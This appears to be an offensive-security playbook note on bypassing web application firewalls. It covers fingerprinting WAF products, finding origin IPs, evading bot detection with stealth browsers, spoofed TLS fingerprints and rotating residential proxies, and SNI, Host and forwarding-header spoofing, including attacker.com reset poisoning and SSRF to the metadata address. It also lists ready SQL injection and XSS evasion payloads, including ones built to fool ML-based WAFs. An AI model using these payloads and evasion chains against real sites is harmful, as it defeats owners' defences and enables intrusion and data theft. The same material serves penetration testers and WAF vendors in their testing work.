---
title: "WAF Bypass"
type: technique
tags: [waf, bypass, encoding, sql-injection, xss]
phase: exploitation
date_created: 2026-11-20
---


# WAF bypass

Distilled from claude-red `offensive-waf-bypass`. Operator promotes; never auto-promoted.

Rule of engagement: when a WAF blocks a payload, identify the product FIRST, then switch technique CLASS; never brute-repeat the same payload shape with minor tweaks.

## Fingerprinting

Detection surface: block/challenge pages, response headers, WAF cookies, CDN routes, injected JS objects, JA3/JA4 mismatch behavior, HTTP/2 vs HTTP/3 policy differences.

| Product | Tell |
|---|---|
| Cloudflare | `__cf_bm`, `cf_clearance`, `cf_chl_*` cookies (rotate ~30 min), `/cdn-cgi/` routes, `_cf_chl_opt` JS object, Turnstile challenges |
| Imperva | `X-CDN: Incapsula` header |
| AWS WAF | `AWSALB` / `AWSALBCORS` cookies |
| Sucuri | `X-Sucuri-ID` header |
| Fastly NG WAF | `fastly-debug-*` headers when enabled |
| Apache generic | accepts lowercase method (`get /`) |
| IIS generic | accepts tab before method |
| ModSecurity | characteristic block/error pages |
| Others | Akamai, F5, Barracuda, Fortinet, DataDome, Radware, Azure Front Door, Coraza, NAXSI |

Tools: wafw00f, identYwaf, GoTestWAF, FTW.

## Bypass ladder (class order, not payload grind)

### Network layer

- Residential/mobile IPs over datacenter; rotate to beat IP rate limits.
- Origin direct: find the real IP (Shodan, CloudFlair, historical DNS via SecurityTrails; ~40% of Fortune-100 origins exposed via stale A records per 2024 research), then send requests with the right Host header. Also check `Alt-Svc` leakage and misconfigured edge redirects exposing bucket hostnames.
- Tools: bypass-firewalls-by-DNS-history, BypassWAF.

### Browser/TLS layer

- Fortify headless: `undetected_chromedriver`, `puppeteer-extra-plugin-stealth`, `playwright-extra` + stealth.
- TLS fingerprint matching: align cipher suites, ALPN order, signature algorithms with a real browser; randomize JA3/JA4 with `noble-tls` / `ja4py` / `tls-client`; `abuse-ssl-bypass-waf` enumerates accepted ciphers.
- Human simulation: random delays, logical navigation, mouse movement, varied timing.
- Anti-fingerprinting: canvas noise, UA rotation, spoofed hardware.
- Honeypots: never fill `display:none` / zero-opacity / off-screen fields.

### Protocol layer

- Host header spoofing (filter checks only Host):
  ```bash
  curl -H "Host: legit.example.net" https://evil.example.com
  ```
- SNI spoofing (filter checks only SNI):
  ```bash
  openssl s_client -connect 198.51.100.23:443 -servername allowed.example.com
  curl -k --connect-to allowed.example.com::198.51.100.23 -H "Host: blocked.example.org" https://allowed.example.com
  ```
  Works through explicit proxies too when the proxy honors the CONNECT IP instead of resolving the SNI itself. Counter on their side: SNI-vs-cert-SAN strict checks (FortiGate).
- SNI omission (RFC 6066 makes it optional):
  ```bash
  curl --insecure -v -H "Host: compass-test.global.ssl.fastly.net" https://151.101.194.133/index.html
  ```
- ECH: encrypts the SNI inside ClientHello; SNI-based filters go blind. Growing in browsers.
- HTTP/2 `:authority` bypass: fronting/Host-validation that only knows HTTP/1.1 misses `:authority`.
  ```bash
  curl --http2 -H "Host: legit-looking-domain.com" https://actual-target-server.com/index.html
  ```
- HTTP/3 over QUIC (443/udp): uninspected by WAFs without QUIC support; announced via `Alt-Svc`.
- Domain fronting: SNI = allowed front domain, Host header = your backend on the same CDN. Historically works on Fastly (`your-service.global.ssl.fastly.net`); AWS CloudFront, Google Cloud CDN, Azure CDN block SNI/Host mismatch.
- Header spoofing against misconfigured proxies (also vulnerability class, not just evasion):
  ```text
  X-Forwarded-Host: attacker.com     (password reset poisoning)
  X-Forwarded-For: 127.0.0.1         (IP restriction bypass)
  X-Real-IP / Client-IP / X-Remote-IP / Forwarded: for=...;host=...
  ```
  Enables reset poisoning, IP-allowlist bypass, open redirect, SSRF toward 169.254.169.254.
- Parameter pollution: `?id=safe&id=malicious`, mixing query/body/header/cookie sources to exploit precedence differences across proxies.
- Method obfuscation: uncommon methods, case change (`gEt`), tabs/spaces before method.
- RFC inconsistencies: CR/LF/CRLF variation, unexpected header line breaks.
- Multiple `Content-Encoding` headers with conflicting values (`invalid` + `gzip`); CVE-2023-50969 is the Imperva duplicate-Content-Encoding case.
- 8k bypass: overload parameters past WAF processing limits.
- IP fragmentation: split the request across packets so WAF and server reassemble differently (modern middleboxes may normalize/drop fragments; measure first).

### Payload layer

SQLi evasions:

```text
SeLeCt / UnIoN                      case variation
UN/**/ION SE/**/LECT                comment injection
UNION/**/SELECT, tabs/newlines/CR   whitespace manipulation
%55%4E%49%4F%4E                     URL encoding
0x53454C454354                      hex encoding
/ -> %2f -> %252f                   double encoding
1 -> 1-0, 1+0, CHAR(49)             numeric forms
CONCAT('a','b') | 'a'||'b' | 'a'+'b'  per-DB string concat
%00' UNION SELECT ...               null byte prefix
```

SQL/JSON syntax evasion (Team82 2022; parser gaps, vendor-patch dependent):

```text
MySQL:      ' OR JSON_EXTRACT('{"a":1}','$.a')=1-- -
PostgreSQL: ' OR '{"b":2}'::jsonb <@ '{"a":1,"b":2}'::jsonb-- -
```

No JSON HTTP request needed; the injection must reach SQL construction. MySQL `->>` shorthand needs a JSON column on the left; for expressions use `JSON_UNQUOTE(JSON_EXTRACT(expr, '$'))`. sqlmap tamper scripts (Atlas suggests combos).

XSS evasions:

```text
<noscript><p title="</noscript><img src=x onerror=alert(1)>">    mXSS parser differential
<svg onload=alert(1)> <details open ontoggle=alert(1)>           alt tags
<script>eval(atob('YWxlcnQoMSk='))</script>                      base64 eval
<img src=x onerror="window['al'+'ert'](1)">                      string split
<script>alert(1)</script>                                   unicode escape
<a href="javas&#99;ript:alert(1)">                               entity encoding
<xss style="animation-name:x" onanimationend="alert(1)">         CSS events
```

CSP bypasses: JSONP endpoints on allowed domains, DOM clobbering (`<form id=self><input name=location>` -> `self.location`), allowed-origin gadgets (postMessage, Trusted Types gaps).

GraphQL: alias spamming past depth limits, batched queries in one request, query-name tampering; tools graphql-cop, inql.

Unicode normalization: NFKD-normalize payloads so chars normalize to malicious values after WAF decode.

### ML/AI WAF layer (Cloudflare AI WAF Attack Score class)

```text
<svg/onload=self[atob('YWxlcnQ='):](1)>          semantic paraphrase
<script>/*benign benign benign*/alert(1)</script> adversarial noise tokens
Cyrillic lookalike of the s in `script` tag      homoglyph (embedding space)
payload in multipart filename                     low-weight feature
SQLi+XSS mixed payload                            context confusion
```

Vary entropy and tokenization to slip n-gram/embedding models; feedback-driven payload evolution (genetic) beats retraining lag.

## Chaining order (source's recommended sequence)

1. residential proxies -> 2. fortified headless -> 3. human behavior -> 4. CAPTCHA handling -> 5. honeypot avoidance -> 6. mixed encodings -> 7. parser inconsistencies -> 8. ML-evading payloads -> 9. TLS/JA3 alignment + HTTP/3 where inspection is weaker -> 10. origin pivot when feasible.

Tools: wafw00f/identYwaf (fingerprint), GoTestWAF/Lightbulb/FTW/WAFBench (test), WAFNinja/WAFTester (evasion), noble-tls/uTLS/tls-client (TLS), enumXFF (XFF enumeration), Nemesida WAF Bypass Tool.

<!-- promoted-slug: waf-bypass -->
